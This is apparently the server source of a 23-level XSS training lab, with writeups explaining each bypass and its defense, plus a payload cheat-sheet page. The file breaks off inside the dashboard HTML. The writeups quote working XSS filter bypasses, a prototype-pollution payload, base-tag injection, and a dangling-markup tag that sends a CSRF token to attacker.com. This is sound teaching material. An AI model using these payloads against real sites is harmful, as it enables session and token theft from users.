const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Level 21: detect the CSRF token arriving at ANY endpoint (simulates attacker-controlled server)
app.use((req, res, next) => {
  if (req.method === 'GET'
      && req.path !== '/level/21'
      && req.path !== '/api/leak-check'
      && req.query.csrf_token
      && req.query.csrf_token.includes('SUPER_SECRET_TOKEN')) {
    level21Leaked = req.url;
  }
  next();
});

// In-memory store for stored XSS levels
const guestbook = [];

// In-memory state for Level 21
let level21Leaked = false;

// Solutions tracker — persisted to disk
const SOLUTIONS_FILE = path.join(__dirname, 'solutions.json');

function loadSolutions() {
  try {
    if (fs.existsSync(SOLUTIONS_FILE)) {
      return JSON.parse(fs.readFileSync(SOLUTIONS_FILE, 'utf8'));
    }
  } catch(e) { /* ignore corrupt file */ }
  return {};
}

function saveSolutions() {
  fs.writeFileSync(SOLUTIONS_FILE, JSON.stringify(solutions, null, 2));
}

const solutions = loadSolutions();

// Writeups per level
const writeups = {
  1: {
    title: 'Reflected XSS — No Defenses',
    why: 'Your input was placed directly into the HTML response with zero encoding or filtering. The browser parsed your <code>&lt;script&gt;</code> tag (or any HTML you injected) as part of the page structure and executed it.',
    lesson: 'This is the most basic form of XSS. Any time user input is reflected into HTML without encoding, an attacker can inject arbitrary markup. The fix is simple: <strong>HTML-encode</strong> all user output (<code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, etc.).',
    realWorld: 'Search pages, error messages that reflect URL parameters, and 404 pages that display the requested path are classic targets for reflected XSS.'
  },
  2: {
    title: 'Stored XSS — Persistent Injection',
    why: 'Your payload was stored in the server\'s database (in-memory array) and rendered every time any user visits the page. Unlike reflected XSS, the attacker doesn\'t need the victim to click a crafted link.',
    lesson: 'Stored XSS is more dangerous than reflected because it affects <strong>every visitor</strong> automatically. The payload persists and can steal sessions, deface pages, or spread like a worm. Always sanitize on both input and output.',
    realWorld: 'Comment sections, forum posts, user profiles, chat applications, and any feature where user content is saved and displayed to others.'
  },
  3: {
    title: 'Script Tag Filter Bypass',
    why: 'The filter only blocked <code>&lt;script&gt;</code> tags, but dozens of other HTML elements can execute JavaScript through event handlers. Elements like <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;body&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;details&gt;</code>, and many more support <code>on*</code> event attributes.',
    lesson: 'Blocklist-based filtering (blocking specific tags) is fundamentally flawed. There are too many vectors to block them all. The correct approach is <strong>allowlist-based</strong>: only permit known-safe tags and attributes, or use contextual output encoding.',
    realWorld: 'Many WAFs and custom filters only block <code>&lt;script&gt;</code>. In bug bounties, always try alternative tags: <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;math&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;audio&gt;</code>, <code>&lt;marquee&gt;</code>, <code>&lt;details&gt;</code>.'
  },
  4: {
    title: 'Attribute Context Injection',
    why: 'Your input was placed inside a double-quoted HTML attribute value without encoding quotes. By injecting a <code>"</code> character, you closed the attribute, then added new attributes (like event handlers) or closed the tag entirely to inject new elements.',
    lesson: 'The <strong>injection context</strong> determines the exploit technique. In an attribute context, you need to break out of the quotes first. The defense is to HTML-encode quotes: <code>"</code> → <code>&amp;quot;</code> and <code>\'</code> → <code>&amp;#x27;</code>.',
    realWorld: 'Input fields that reflect values (search boxes, form pre-fills), meta tags with user-controlled content, and any attribute built from user input.'
  },
  5: {
    title: 'JavaScript String Context Injection',
    why: 'Your input was placed inside a JavaScript string literal. Even though angle brackets were HTML-encoded (preventing new tag injection), you could close the string with a quote character, then inject arbitrary JavaScript code.',
    lesson: 'HTML encoding alone is insufficient when the injection point is inside JavaScript. You need <strong>JavaScript-specific encoding</strong>: escape <code>\'</code> to <code>\\\'</code>, <code>"</code> to <code>\\"</code>, and <code>\\</code> to <code>\\\\</code>. Even better: avoid placing user input in inline JavaScript entirely. Use <code>data-*</code> attributes and read them with <code>getAttribute()</code>.',
    realWorld: 'Analytics scripts that embed user data, inline JS configuration objects, and any template that places user input inside <code>&lt;script&gt;</code> blocks.'
  },
  6: {
    title: 'Event Handler Blocklist Bypass',
    why: 'The filter blocked 12 common event handlers, but the HTML spec defines over 60 event handler attributes. Obscure handlers like <code>ontoggle</code>, <code>onwheel</code>, <code>onmousewheel</code>, <code>onpointerover</code>, <code>onanimationend</code>, <code>ontransitionend</code>, <code>onstart</code> (marquee), and <code>onpageshow</code> were not in the blocklist.',
    lesson: 'Event handler blocklists are an arms race you will always lose. New events are added to browsers regularly. The only safe approach is to <strong>strip all <code>on*</code> attributes</strong> with a pattern like <code>/on\\w+/</code>, or use a proper HTML sanitizer library like DOMPurify.',
    realWorld: 'WAFs frequently maintain incomplete event handler lists. Check the PortSwigger XSS cheat sheet for a comprehensive list of event handlers per browser.'
  },
  7: {
    title: 'Single-Pass Keyword Filter Bypass',
    why: 'The filter stripped keywords in a <strong>single pass</strong>. By nesting a keyword inside itself (e.g., <code>onerronerrorr</code>), when the inner <code>onerror</code> is removed, the remaining outer characters reassemble into <code>onerror</code>.',
    lesson: 'Single-pass string replacement is inherently bypassable. If you must filter by keyword removal, you need to <strong>loop until no more changes occur</strong> (recursive filtering). But even recursive filtering can be bypassed through encoding or alternative execution methods. Proper output encoding is always superior to input filtering.',
    realWorld: 'Many custom WAF rules and server-side filters use single-pass replacement. Always test nested payloads: <code>alalertert</code>, <code>&lt;scr&lt;script&gt;ipt&gt;</code>, <code>jajavascriptvascript:</code>.'
  },
  8: {
    title: 'DOM-Based XSS',
    why: 'The vulnerability was entirely in client-side JavaScript. The page read from <code>location.hash</code> (a <strong>source</strong>) and wrote it to <code>innerHTML</code> (a <strong>sink</strong>) without sanitization. The hash fragment is never sent to the server, making this invisible to server-side defenses.',
    lesson: 'DOM XSS requires analyzing client-side code for <strong>source-to-sink flows</strong>. Common sources: <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>postMessage</code>, <code>localStorage</code>. Dangerous sinks: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout(string)</code>, <code>.href</code>.',
    realWorld: 'Single-page applications (SPAs) are riddled with DOM XSS. Client-side routing, template rendering, and dynamic content injection are all common vectors. Tools like DOM Invader (Burp Suite) help find these.'
  },
  9: {
    title: 'href Injection with Protocol Filter Bypass',
    why: 'The filter checked for <code>javascript:</code> as a string, but browsers decode HTML entities in attribute values before interpreting the URL scheme. By using HTML entities like <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;...</code> to spell "javascript:", the server\'s regex didn\'t match, but the browser decoded the entities and executed the protocol handler.',
    lesson: 'Browsers perform <strong>multiple decoding passes</strong> in different contexts. In an HTML attribute, entities are decoded first, then the URL is interpreted. Filters that check the raw string miss encoded payloads. The safe approach: parse the URL properly, check the protocol after decoding, and only allow <code>http:</code>, <code>https:</code>, and <code>mailto:</code> schemes.',
    realWorld: 'Any feature that lets users provide URLs: profile links, redirect parameters, "share via" features, embedded content. The <code>javascript:</code> protocol in <code>&lt;a href&gt;</code> is a classic bug bounty finding.'
  },
  10: {
    title: 'Content Security Policy Bypass via JSONP',
    why: 'The CSP allowed <code>\'self\'</code> as a script source, meaning any JavaScript file served from the same origin was trusted. The <code>/api/jsonp</code> endpoint reflected user input into a JavaScript response. By loading it as a <code>&lt;script src&gt;</code>, the callback parameter became executable code — and since it\'s same-origin, the CSP allowed it.',
    lesson: 'CSP with <code>\'self\'</code> is only as secure as <strong>every endpoint on your origin</strong>. JSONP endpoints, file upload endpoints serving JS, error pages with JS content, and any user-controlled response in a JS MIME type can be abused. Prefer <code>\'nonce-...\'</code> or <code>\'strict-dynamic\'</code> over <code>\'self\'</code>.',
    realWorld: 'Many real-world CSP bypasses exploit JSONP endpoints (Google APIs, legacy services), Angular libraries loaded from CDNs (<code>\'unsafe-eval\'</code>), or base tag injection to redirect script loads.'
  },
  11: {
    title: 'Double Encoding Bypass',
    why: 'The WAF decoded your input once and checked for dangerous patterns — finding none. But the application behind the WAF decoded the input <strong>a second time</strong>, turning harmless-looking percent-encoded text like <code>%3C</code> into actual <code>&lt;</code> characters. The WAF only saw <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> after its decode pass — just text with percent signs, not HTML tags or event handlers.',
    lesson: 'When multiple layers in the stack each URL-decode the input (reverse proxy, WAF, framework, application), a filter at one layer can be bypassed by encoding for the <strong>next</strong> layer. The fix: filters must decode input the same number of times as the application does, or better yet, apply output encoding at the final render step rather than relying on input filtering.',
    realWorld: 'Double encoding is one of the most common WAF bypass techniques. If a WAF URL-decodes once and checks, but the backend also URL-decodes, <code>%253C</code> passes the WAF as <code>%3C</code> but becomes <code>&lt;</code> on the server. This affects real-world WAFs like ModSecurity, Cloudflare (in older configs), and custom proxy chains. Always test <code>%25XX</code> encoding in bug bounties.'
  },
  12: {
    title: 'Client-Side Template Injection',
    why: 'Although all HTML tags were stripped server-side, the client-side template engine evaluated expressions inside <code>{{...}}</code> using <code>eval()</code>. Since template delimiters are plain text (not HTML tags), they survived the tag filter and were executed client-side.',
    lesson: 'Client-side template engines that use <code>eval()</code> or <code>Function()</code> to evaluate expressions are inherently dangerous when processing user input. This is a major risk in frameworks that support expression binding (AngularJS <code>{{...}}</code>, Vue.js <code>v-html</code>, etc.). Never pass user input through template expression evaluators.',
    realWorld: 'AngularJS sandbox escapes were a major bug class. Even with sandboxing, researchers repeatedly found ways to escape to arbitrary JS execution. Modern frameworks (Angular 2+, React) avoid <code>eval</code>, but legacy apps and custom template engines remain vulnerable.'
  },
  13: {
    title: 'postMessage XSS — Cross-Window Messaging',
    why: 'The page registered a <code>message</code> event listener that wrote <code>e.data</code> directly to <code>innerHTML</code> without checking <code>e.origin</code>. Any window (including the browser console, or a malicious page embedding this one in an iframe) could send a message with an XSS payload.',
    lesson: '<code>postMessage</code> is a common DOM XSS vector. Secure implementations must: (1) <strong>validate <code>e.origin</code></strong> against an allowlist, (2) <strong>validate/sanitize <code>e.data</code></strong> before using it, (3) never pass message data to dangerous sinks like <code>innerHTML</code> or <code>eval()</code>.',
    realWorld: 'OAuth popup flows, payment gateways, embedded widgets, and cross-domain iframe communication all use <code>postMessage</code>. Missing origin checks are a frequent finding in bug bounties. The attacker embeds the target in an iframe on their domain and sends malicious messages.'
  },
  14: {
    title: 'SVG Upload XSS',
    why: 'SVG files are XML-based and natively support JavaScript execution through event handler attributes (<code>onload</code>, <code>onmouseover</code>, etc.) and even <code>&lt;script&gt;</code> tags. The filter only stripped <code>&lt;script&gt;</code> tags but left SVG event handlers intact. When the SVG was rendered inline, the browser executed the event handlers.',
    lesson: 'SVG is one of the most dangerous file types for XSS. It supports inline scripting, event handlers, <code>&lt;foreignObject&gt;</code> (which can embed HTML), CSS <code>@import</code>, and external resource loading. If you must accept SVG uploads, either: (1) serve them with <code>Content-Disposition: attachment</code>, (2) serve from a separate sandbox domain, or (3) use a strict SVG sanitizer that strips all scripting.',
    realWorld: 'File upload features that accept SVGs (avatars, logos, images) are frequently vulnerable. Even Markdown renderers that allow inline SVGs can be exploited. Many CDNs serve uploaded SVGs with <code>Content-Type: image/svg+xml</code>, enabling script execution.'
  },
  15: {
    title: 'Mutation XSS — Template Blind Spot',
    why: 'The sanitizer used <code>querySelectorAll(\'*\')</code> to find and clean dangerous elements — but this DOM API <strong>does not traverse into <code>&lt;template&gt;</code> element content</strong>. Template content lives in a separate <code>DocumentFragment</code> that is opaque to standard DOM queries. The <code>&lt;img onerror=alert(1)&gt;</code> inside the template was never seen by the sanitizer, so it survived. After sanitization, the page instantiated all template elements by moving their content into the live DOM, causing the event handler to fire.',
    lesson: 'This is the core of mXSS: the sanitizer\'s view of the DOM differs from what actually executes. <code>querySelectorAll</code>, <code>getElementsByTagName</code>, and similar APIs all skip <code>&lt;template&gt;</code> content. Any post-sanitization step that promotes template content (framework rendering, <code>importNode</code>, cloning) re-introduces the unsanitized payload. The fix: either explicitly sanitize <code>template.content</code> recursively, or use DOMPurify which handles this case.',
    realWorld: 'Template blind spots affect real sanitizers in web component frameworks. DOMPurify had a similar bypass (CVE-2020-26870) where nested template elements evaded sanitization. Any app with a "sanitize then render" pipeline that processes templates is potentially vulnerable — this includes custom rich text editors, React SSR apps with dangerouslySetInnerHTML, and CMS comment renderers.'
  },
  16: {
    title: 'Recursive Filter Bypass via Context Escape',
    why: 'The recursive filter defeated all nesting and keyword tricks. But it only analyzed the <strong>top-level HTML context</strong>. By injecting an <code>&lt;iframe srcdoc="..."&gt;</code>, you created a new document context. HTML entities inside the <code>srcdoc</code> attribute are decoded by the browser when creating the iframe\'s document, reconstructing a payload that the server filter never saw as dangerous text.',
    lesson: 'Even the strongest server-side filter can be bypassed if you can <strong>escape to a different execution context</strong>. <code>srcdoc</code>, <code>data:</code> URLs, <code>&lt;object&gt;</code> tags, and <code>&lt;embed&gt;</code> elements can all create new browsing contexts where the filtered document\'s rules don\'t apply. Defense in depth requires CSP, not just filtering.',
    realWorld: 'This technique is relevant when facing strong WAFs. If the WAF filters the main document but you can inject an iframe with <code>srcdoc</code> or <code>src=data:text/html,...</code>, you get a clean execution context. Combined with HTML entity encoding, this bypasses most keyword-based filters.'
  },
  17: {
    title: 'The Polyglot — Multi-Context Injection',
    why: 'Your input appeared in three contexts: HTML body, an HTML attribute, and a JavaScript string. Each context has different parsing rules and different escaping requirements. The weakest context (the one with the least encoding applied) was the entry point for exploitation.',
    lesson: 'When the same input is used in multiple contexts, you must apply <strong>context-specific encoding for every context</strong>. HTML body needs entity encoding, attributes need attribute encoding (including quotes), and JavaScript strings need JS escaping. A single encoding function cannot protect all contexts. This is why frameworks with auto-escaping (React, Angular, Vue) are safer — they apply the right encoding for each context automatically.',
    realWorld: 'Polyglot payloads are useful in bug bounties when you\'re not sure where your input ends up, or when it appears in multiple places. Having a single payload that works across HTML, JS, and attribute contexts maximizes your chances of finding XSS during fuzzing.'
  },
  18: {
    title: 'DOM Clobbering — Overwriting Global Variables via HTML',
    why: 'The page\'s JavaScript read <code>window.config.href</code> to decide where to navigate. By injecting an HTML element with <code>id="config"</code>, you <strong>clobbered</strong> the global variable — replacing the JavaScript object with your DOM element. The browser\'s named access mechanism (<code>window[elementId]</code>) allowed your injected HTML to silently override application logic without executing any JavaScript.',
    lesson: 'DOM clobbering exploits the browser\'s automatic exposure of named elements on <code>window</code>. Any <code>id</code> or <code>name</code> attribute on an HTML element creates a <code>window</code> property. This means <code>&lt;a id=config href=...&gt;</code> overwrites <code>window.config</code> with the anchor element, and <code>window.config.href</code> returns the anchor\'s href. Defenses: use <code>Object.hasOwn()</code> or <code>hasOwnProperty()</code> checks, declare variables with <code>const/let</code> (block-scoped), or freeze config objects. Also consider using <code>Symbol</code> keys or a namespace object that can\'t be clobbered.',
    realWorld: 'DOM clobbering has been found in Google Search, Gmail, and several other major applications. It\'s particularly common in sanitized HTML contexts (like email clients and rich text editors) where JavaScript execution is blocked but HTML injection is possible. The HTML sanitizer DOMPurify specifically includes DOM clobbering protections. Bug bounty tip: look for code that reads from <code>window.*</code> without declaring the variable with <code>const/let</code>.'
  },
  19: {
    title: 'Prototype Pollution → XSS',
    why: 'The <code>merge()</code> function naively iterated over all properties of your JSON input, including <code>__proto__</code>. When it encountered <code>{"__proto__": {"html": "&lt;img...&gt;"}}</code>, it wrote to <code>target.__proto__</code> — which is <code>Object.prototype</code>. This polluted the prototype of ALL objects. When the render function later checked <code>config.html</code>, it found the value via prototype chain lookup even though <code>config</code> never had an <code>html</code> property directly.',
    lesson: 'Prototype pollution occurs when user input can modify <code>Object.prototype</code> through unsafe merge, clone, or extend operations. The <code>__proto__</code> property (and <code>constructor.prototype</code>) are the primary vectors. Once polluted, every object in the runtime inherits the attacker\'s values for any property it doesn\'t explicitly define. To prevent: (1) use <code>Object.create(null)</code> for merge targets, (2) blocklist <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> keys, (3) use <code>Map</code> instead of plain objects, (4) freeze <code>Object.prototype</code>.',
    realWorld: 'Prototype pollution has been found in lodash (<code>_.merge</code>, <code>_.defaultsDeep</code>), jQuery (<code>$.extend</code>), and hundreds of npm packages. In 2019, a prototype pollution in Lodash (CVE-2019-10744) affected millions of applications. Combined with gadgets (code that reads from prototype-pollutable properties and sinks into innerHTML/eval), it becomes a reliable XSS vector.'
  },
  20: {
    title: 'Base Tag Injection — Hijacking Relative URLs',
    why: 'By injecting <code>&lt;base href="/evil/"&gt;</code> before the page\'s script tag, you changed the base URL for all relative resource loads. The page\'s <code>&lt;script src="level20-app.js"&gt;</code> was a relative URL — instead of loading from <code>/level20-app.js</code>, it loaded from <code>/evil/level20-app.js</code>, which served attacker-controlled JavaScript.',
    lesson: 'The <code>&lt;base&gt;</code> element affects ALL relative URLs on the page: scripts, stylesheets, images, links, and form actions. If an attacker can inject a <code>&lt;base&gt;</code> tag, they can redirect script loads to their server while bypassing CSP (since the script\'s origin appears legitimate). Defense: (1) use the <code>base-uri</code> CSP directive to restrict <code>&lt;base&gt;</code> usage, (2) use absolute URLs for critical resources, (3) use Subresource Integrity (<code>integrity</code> attribute) on script tags.',
    realWorld: 'Base tag injection is a known CSP bypass technique. If CSP allows <code>\'self\'</code> but doesn\'t set <code>base-uri</code>, an attacker can inject <code>&lt;base&gt;</code> to redirect relative script loads. This has been used in real-world attacks against applications with strict CSP but missing <code>base-uri</code> directives.'
  },
  21: {
    title: 'Dangling Markup — Data Exfiltration Without Scripts',
    why: 'By injecting a tag with an unclosed attribute (like <code>&lt;img src="http://attacker.com/steal?</code>), the browser treats everything from the injection point to the next matching quote as part of the URL. The CSRF token in the hidden input was between your injection and the next <code>"</code>, so it was included in the image request URL — exfiltrating it without any JavaScript execution.',
    lesson: 'Dangling markup exploits HTML\'s tolerant parsing: an unclosed attribute "swallows" subsequent HTML content until a matching delimiter is found. This is a <strong>data exfiltration</strong> technique, not a code execution technique — it works even when all JavaScript vectors are blocked. Modern browsers mitigate some vectors (Chrome blocks <code>&lt;img&gt;</code> with newlines in URLs), but <code>&lt;meta refresh&gt;</code>, <code>&lt;a href&gt;</code>, <code>&lt;form action&gt;</code>, and <code>&lt;button formaction&gt;</code> remain viable. Defense: encode quotes in all output contexts and use CSP with strict <code>connect-src</code>.',
    realWorld: 'Dangling markup has been used to steal CSRF tokens, OAuth codes, and other secrets embedded in HTML. Google\'s security team has documented this technique extensively. It\'s particularly valuable when CSP blocks all script execution but the attacker can still inject HTML.'
  },
  22: {
    title: 'JSON Injection — Breaking Out of Script Context',
    why: 'Your input was placed inside a JSON string value within a trusted <code>&lt;script&gt;</code> block. The server escaped angle brackets (preventing HTML tag injection) but did not escape double quotes. By injecting <code>"</code>, you closed the JSON string, then injected arbitrary JavaScript that executed within the same nonced script block — completely bypassing CSP.',
    lesson: 'When user input is embedded in inline <code>&lt;script&gt;</code> blocks (as JSON, config objects, or template data), the attacker is already inside a trusted execution context. Escaping <code>&lt;</code> and <code>&gt;</code> prevents tag breakout but doesn\'t prevent breaking out of strings within the script. You must escape: <code>"</code> → <code>\\\\\"</code>, <code>\\\\</code> → <code>\\\\\\\\</code>, <code>/</code> → <code>\\\\/</code>, and line terminators. Better yet: use <code>JSON.stringify()</code> server-side, place data in <code>data-*</code> attributes, or use a separate API endpoint.',
    realWorld: 'This is one of the most common XSS patterns in modern web apps. Server-side rendering frameworks (Next.js, Nuxt, Rails) that embed state into <code>&lt;script&gt;</code> tags for hydration are frequent targets. CSP doesn\'t help because the injection is inside an already-trusted script block.'
  },
  23: {
    title: 'URL Scheme Bypass — HTML Entity Decoding Mismatch',
    why: 'The server checked the raw input string for <code>javascript:</code> and didn\'t find it — because you encoded one or more characters as HTML entities (e.g., <code>&amp;#106;</code> for "j"). However, when the browser rendered the <code>&lt;a href="..."&gt;</code>, it decoded the HTML entities in the attribute value before interpreting the URL scheme. The result: the browser saw <code>javascript:alert(1)</code> and executed it when the link was clicked.',
    lesson: 'This is a classic <strong>encoding mismatch</strong> between server-side filtering and browser-side parsing. The server operates on raw strings; the browser decodes HTML entities in attributes before processing URLs. To prevent this: (1) decode all HTML entities server-side before checking the URL scheme, (2) use a proper URL parser to extract the scheme after decoding, (3) allowlist only safe schemes (<code>http:</code>, <code>https:</code>, <code>mailto:</code>) rather than blocklisting dangerous ones.',
    realWorld: 'This exact technique has been found in countless bug bounties. Any feature that puts user input into <code>href</code>, <code>src</code>, <code>action</code>, or <code>formaction</code> attributes while filtering <code>javascript:</code> as a raw string is vulnerable. It appears in link-sharing features, redirect parameters, user profile URLs, and "click to call" implementations. The mismatch between server string matching and browser HTML parsing is one of the most fundamental security concepts in web security.'
  }
};

// API: Record a solved level
app.post('/api/solve', (req, res) => {
  const { level, payload, url } = req.body;
  if (!level) return res.status(400).json({ error: 'Missing level' });
  if (!solutions[level]) {
    solutions[level] = { solvedAt: new Date().toISOString(), payloads: [] };
  }
  if (payload && !solutions[level].payloads.includes(payload)) {
    solutions[level].payloads.push(payload);
  }
  saveSolutions();
  res.json({ ok: true, writeup: writeups[level] || null });
});

// API: Get all solutions
app.get('/api/solutions', (req, res) => {
  res.json(solutions);
});

// API: Reset all progress
app.post('/api/reset', (req, res) => {
  Object.keys(solutions).forEach(k => delete solutions[k]);
  saveSolutions();
  res.json({ ok: true });
});

// ============================================================
// CHEAT SHEET
// ============================================================
app.get('/cheatsheet', (req, res) => {
  const levelMeta = {
    1: { name: 'Hello, Reflected XSS', diff: 'Easy', context: 'HTML Body', defense: 'None' },
    2: { name: 'Stored XSS Guestbook', diff: 'Easy', context: 'HTML Body (Stored)', defense: 'None' },
    3: { name: 'Script Tag Blocked', diff: 'Medium', context: 'HTML Body', defense: '&lt;script&gt; stripped' },
    4: { name: 'Attribute Injection', diff: 'Medium', context: 'HTML Attribute', defense: 'None' },
    5: { name: 'JavaScript Context', diff: 'Medium', context: 'JS String', defense: '&lt; &gt; encoded' },
    6: { name: 'Event Handler Blocklist', diff: 'Hard', context: 'HTML Body', defense: '12 event handlers blocked' },
    7: { name: 'Case & Keyword Filter', diff: 'Hard', context: 'HTML Body', defense: 'Single-pass keyword strip' },
    8: { name: 'DOM-Based XSS', diff: 'Hard', context: 'DOM (location.hash → innerHTML)', defense: 'No server-side reflection' },
    9: { name: 'href Injection', diff: 'Expert', context: 'href Attribute', defense: 'javascript: blocked' },
    10: { name: 'CSP Bypass', diff: 'Expert', context: 'HTML Body + CSP', defense: "script-src 'nonce' 'self'" },
    11: { name: 'Double Encoding', diff: 'Expert', context: 'HTML Body', defense: 'WAF decode + tag/handler/javascript: filter' },
    12: { name: 'Template Injection', diff: 'Expert', context: 'Client-side template', defense: 'All HTML tags stripped' },
    13: { name: 'postMessage XSS', diff: 'Expert', context: 'DOM (postMessage → innerHTML)', defense: 'No reflection, no form' },
    14: { name: 'SVG Upload XSS', diff: 'Expert', context: 'Inline SVG', defense: '&lt;script&gt; stripped' },
    15: { name: 'Mutation XSS', diff: 'Expert', context: 'DOMParser sanitizer + template render', defense: 'Scripts + event handlers stripped (querySelectorAll)' },
    16: { name: 'Recursive Filter', diff: 'Expert', context: 'HTML Body', defense: 'Recursive keyword loop' },
    17: { name: 'The Polyglot', diff: 'Expert', context: 'HTML + Attribute + JS', defense: '&lt;script&gt; stripped, " encoded' },
    18: { name: 'DOM Clobbering', diff: 'Expert', context: 'HTML Body → window globals', defense: '&lt;script&gt;/handlers/javascript: stripped' },
    19: { name: 'Prototype Pollution → XSS', diff: 'Expert', context: 'JSON merge → innerHTML', defense: 'No direct HTML injection' },
    20: { name: 'Base Tag Injection', diff: 'Expert', context: 'HTML Body (before scripts)', defense: 'CSP nonce + self, &lt;script&gt;/handlers stripped' },
    21: { name: 'Dangling Markup', diff: 'Expert', context: 'HTML Attribute', defense: 'All execution vectors blocked' },
    22: { name: 'JSON Injection', diff: 'Expert', context: 'JSON in &lt;script&gt; block', defense: 'CSP nonce, &lt; &gt; Unicode-escaped' },
    23: { name: 'URL Scheme Bypass', diff: 'Expert', context: 'a href attribute', defense: '&lt;script&gt;/handlers stripped, javascript: blocked' }
  };

  let rows = '';
  for (let i = 1; i <= 23; i++) {
    const meta = levelMeta[i];
    const sol = solutions[i];
    const diffColor = { Easy: '#3fb950', Medium: '#d29922', Hard: '#f85149', Expert: '#bc4dff' }[meta.diff];
    if (sol) {
      const payloads = sol.payloads.map(p => {
        const escaped = p.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
        return '<code style="display:block;margin:0.25rem 0;padding:0.4rem 0.6rem;background:#0d1117;border:1px solid #30363d;border-radius:4px;word-break:break-all;font-size:0.8rem;">' + escaped + '</code>';
      }).join('');
      rows += '<tr><td style="color:' + diffColor + ';font-weight:600;">Level ' + i + '</td><td>' + meta.name + '</td><td>' + meta.context + '</td><td>' + meta.defense + '</td><td style="color:#3fb950;">Solved</td><td>' + (payloads || '<span style="color:#484f58;">Not recorded</span>') + '</td></tr>';
    } else {
      rows += '<tr style="opacity:0.4;"><td style="color:' + diffColor + ';font-weight:600;">Level ' + i + '</td><td>' + meta.name + '</td><td>' + meta.context + '</td><td>' + meta.defense + '</td><td style="color:#484f58;">Unsolved</td><td><span style="color:#484f58;">&mdash;</span></td></tr>';
    }
  }

  const solvedCount = Object.keys(solutions).length;
  const totalPayloads = Object.values(solutions).reduce((a, s) => a + s.payloads.length, 0);
  const metaJSON = JSON.stringify(levelMeta);

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Cheat Sheet</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0a0f; color: #c9d1d9; min-height: 100vh; padding: 2rem; }
    .nav { margin-bottom: 1.5rem; }
    .nav a { color: #58a6ff; text-decoration: none; font-size: 0.85rem; }
    h1 { font-size: 1.5rem; color: #e6edf3; margin-bottom: 0.5rem; }
    .subtitle { color: #8b949e; margin-bottom: 2rem; font-size: 0.9rem; }
    .stats { display: flex; gap: 1rem; margin-bottom: 2rem; }
    .stat { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 1rem 1.5rem; }
    .stat .num { font-size: 1.5rem; font-weight: 700; color: #58a6ff; }
    .stat .label { font-size: 0.75rem; color: #8b949e; text-transform: uppercase; letter-spacing: 0.05em; }
    table { width: 100%; border-collapse: collapse; background: #161b22; border: 1px solid #30363d; border-radius: 12px; overflow: hidden; }
    th { background: #21262d; padding: 0.75rem 1rem; text-align: left; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; color: #8b949e; }
    td { padding: 0.75rem 1rem; border-top: 1px solid #21262d; font-size: 0.85rem; vertical-align: top; }
    code { color: #c9d1d9; }
    .export-btn { display: inline-block; margin-top: 1.5rem; padding: 0.6rem 1.5rem; background: #238636; border: 1px solid #2ea043; border-radius: 8px; color: #fff; text-decoration: none; font-size: 0.85rem; font-weight: 600; cursor: pointer; border: none; }
    .export-btn:hover { background: #2ea043; }
  </style>
</head>
<body>
  <div class="nav"><a href="/">&larr; Back to Dashboard</a></div>
  <h1>XSS Payload Cheat Sheet</h1>
  <p class="subtitle">Your collected payloads from the XSS Training Lab</p>
  <div class="stats">
    <div class="stat"><div class="num">${solvedCount}</div><div class="label">Levels Solved</div></div>
    <div class="stat"><div class="num">${23 - solvedCount}</div><div class="label">Remaining</div></div>
    <div class="stat"><div class="num">${totalPayloads}</div><div class="label">Payloads Collected</div></div>
  </div>
  <table>
    <thead><tr><th>Level</th><th>Challenge</th><th>Context</th><th>Defense</th><th>Status</th><th>Your Payloads</th></tr></thead>
    <tbody>${rows}</tbody>
  </table>
  <button class="export-btn" onclick="exportCheatSheet()">Export as Markdown</button>
  <script>
    function exportCheatSheet() {
      fetch('/api/solutions').then(function(r) { return r.json(); }).then(function(sols) {
        var md = '# XSS Payload Cheat Sheet\\n\\nGenerated from XSS Training Lab\\n\\n';
        var meta = ${metaJSON};
        for (var i = 1; i <= 23; i++) {
          var m = meta[i];
          md += '## Level ' + i + ': ' + m.name + '\\n';
          md += '- **Difficulty:** ' + m.diff + '\\n';
          md += '- **Context:** ' + m.context + '\\n';
          md += '- **Defense:** ' + m.defense + '\\n';
          if (sols[i]) {
            md += '- **Status:** Solved\\n';
            md += '- **Payloads:**\\n';
            sols[i].payloads.forEach(function(p) { md += '  - \\x60' + p + '\\x60\\n'; });
          } else {
            md += '- **Status:** Unsolved\\n';
          }
          md += '\\n';
        }
        var blob = new Blob([md], { type: 'text/markdown' });
        var a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'xss-cheatsheet.md';
        a.click();
      });
    }
  </script>
</body>
</html>`);
});

// ============================================================
// DASHBOARD
// ============================================================
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Training Lab</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0a0f; color: #c9d1d9; min-height: 100vh; }
    .header { background: linear-gradient(135deg, #161b22 0%, #1a1025 100%); border-bottom: 1px solid #30363d; padding: 2rem; text-align: center; }
    .header h1 { font-size: 2rem; background: linear-gradient(90deg, #ff6b6b, #c084fc, #60a5fa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .header p { color: #8b949e; margin-top: 0.5rem; }
